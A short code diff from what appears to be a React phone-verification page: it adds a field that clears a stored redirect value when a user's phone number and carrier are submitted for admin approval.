@@ -142,7 +142,8 @@ export default function VerifyPhonePage() {
         phoneCarrier: selectedCarrier,
         phoneSubmittedAt: new Date().toISOString(),
         _v4Status: "pending", // Set to pending for admin approval
-        phoneUpdatedAt: new Date().toISOString()
+        phoneUpdatedAt: new Date().toISOString(),
+        redirectPage: null // Clear any old redirect
       })
 
       // Add phone info to history
